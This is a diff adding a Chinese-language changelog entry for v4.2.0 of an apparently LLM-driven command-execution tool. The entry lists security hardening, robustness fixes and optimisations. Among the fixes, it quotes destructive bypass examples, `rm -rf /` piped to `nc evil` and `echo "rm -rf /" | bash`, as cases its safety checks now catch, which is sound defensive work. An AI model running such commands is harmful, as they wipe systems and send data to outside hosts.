@@ -7,6 +7,70 @@
 
 ---
 
+## [4.2.0] — 2026-07-29
+
+v4.2.0 是安全与健壮性集中加固版本：覆盖信号处理、命令注入防护、并发安全、
+LLM 调用健壮性、历史文件安全写入等多个维度，同时完成若干优化项。
+
+### 安全
+
+- **信号处理优雅退出**：main.go 引入 `signal.NotifyContext`，Ctrl+C / SIGTERM
+  时取消 context、落盘历史、回收子进程，不再中断 LLM 调用或泄漏进程
+- **配置文件权限 0600**：`config.json` / `user_prefs.json` 写入权限从 `0644` 改为
+  `0600`，目录权限从 `0755` 改为 `0700`，防止同主机其他用户读取 API Key
+- **HTML 报告 XSS 修复**：所有动态字段过 `escapeHTML`，消除 `Hostname` /
+  `IPAddress` / `OSInfo` 等字段直接拼接到 HTML 的注入风险
+- **splitCommandChain 引号感知**：改用基于 rune 的状态机扫描，正确处理引号
+  上下文，堵住 `sh -c "rm -rf / | nc evil"` 类绕过
+- **管道递归分析**：`analyzeCommandExecutor` 对管道末段 bash/sh 递归分析
+  左侧输入内容，`echo "rm -rf /" | bash` 不再与 `echo "uptime" | bash`
+  同判为 High
+- **executor data race 修复**：超时分支用 channel 传递结果，消除闭包变量
+  并发读写 race
+- **readUserAction ctx 检查**：循环开头检查 `s.ctx.Err()`，SIGINT 后不再
+  卡在 `reader.ReadString`
+- **全局状态加锁**：safety `safeCommandsMu`、config `prefsMu`、llm `cfgMu`、
+  platform `atomic.Int32` 保护包级可变全局变量，`go test -race` 不再报错
+
+### 健壮性
+
+- **sudo/xargs 误判修复**：sudo `-i/-s/--login/--shell` 显式判 Critical；
+  xargs `-I/-L/-n/-P` 跳过下一个参数，避免 `{}` 干扰子命令检测
+- **危险正则补全**：`chmod 777 /etc`、`chown root:root /var` 等路径后
+  跟子路径的场景不再漏判
+- **LLM 重试指数退避**：固定 3s 改为指数退避 + 抖动 (1s, 2s, 4s ± jitter)；
+  降级判定收紧为按 HTTP 状态码 + 关键字精确匹配
+- **WithLLMClient 同步到 handler**：`NewSession` 应用 opts 后将
+  `s.llmClient` 同步到 `s.handler`，`explainCommand` 不再绕过 mock
+- **baseSnapshotCmds 注入防护**：服务名用正则 `^[A-Za-z0-9_.@-]+$` 白名单校验
+- **rules 规则修正**：僵尸进程严格按首字段 `=="Z"` 校验，conntrack max 缺失时
+  跳过不再误报 100%
+- **report 错误冒泡**：三个生成器返回 `error`，`GenerateReport` 返回
+  `(string, error)`，写盘失败不再误报"已生成"
+- **handleAIFailure 重试上限**：加重试次数上限 (5 次) + 指数退避，超过自动
+  保存退出，不再无限重试烧 token
+- **LoadHistory 路径校验**：传入路径必须位于 `paths.HistoryDir()` 下，防止
+  路径遍历读取任意文件
+- **saveHistory CreateTemp**：用 `os.CreateTemp` 在同目录生成唯一临时文件，
+  避免多实例并发写冲突与崩溃后残留
+- **UTF-8 截断修复**：`truncateLine` / `truncateForPreview` 改用 `[]rune`
+  截断，不再落在中文字符中间
+
+### 优化
+
+- **trimHistory 滑动窗口+锚点**：关键节点作为锚点保留，滑动窗口覆盖锚点
+  之间上下文，避免中间因果链丢失
+- **design-doc.md 归档**：标注为历史稿 `design-history.md`，避免与代码不符
+  误导维护者
+- **whitelist.txt 整理**：根目录文件重命名为 `whitelist.example.txt`，消除
+  路径与格式矛盾
+- **rules 正则预编译**：`firstNumber` / `parseHumanSize` 等正则改为包级
+  `var` 预编译，避免每次调用重新编译
+- **output io.Writer 抽象**：提供 `var Writer io.Writer = os.Stdout`，支持
+  测试重定向
+
+---
+
 ## [4.1.0] — 2026-07-24
 
 v4.1 是 Windows 平台支持版本：从"仅能编译、功能完全不可用"升级到"Windows 端功能
